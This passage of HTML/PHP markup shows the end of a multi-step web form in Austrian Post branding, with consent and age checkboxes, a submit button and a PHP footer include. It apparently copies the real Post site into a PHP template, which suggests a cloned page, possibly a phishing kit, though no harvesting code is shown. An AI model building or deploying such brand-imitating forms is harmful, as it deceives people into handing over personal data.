                                                <div>Ich erteile hiermit meine Einwilligung zur Verwendung meiner personenbezogenen Daten zum Zweck der Übermittlung von Informationen über Produkte und Dienstleistungen durch die Österreichische Post AG.&nbsp; <a href="~/link.aspx?_id=0877F21255E343FC8A0BFE814B215BB2&amp;_z=z">Details finden Sie hier.</a>
                                                </div>
                                            </div>
                                            <span class="sc-form__checkbox__indicator"></span>
                                        </label>
                                        <p class="steps__agb">Ich habe die <a href="https://www.post.at/co/c/datenschutz" class="content__linkbtn">Datenschutzbestimmungen</a> zur Kenntnis genommen und bestätige, dass ich mindestens 16 Jahre alt bin. </p>
                                        <div class="steps__buttons">
                                            <button  name="page2_submit" type="submit" title="Nächster Schritt" class="linkbtn linkbtn__primary">
                                                <span class="linkbtn__text">Weiter</span>
                                                <span class="linkbtn__icon posticon_Posticon-Button-Pfeil-Weiter"></span>
                                            </button>
                                        </div>
                                    </div>
                                </form>
                            </div>
                    </main>
                </div>
            </div>
        </div>
    </div>



<div>
</div>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<?php
include('footer-him.php');
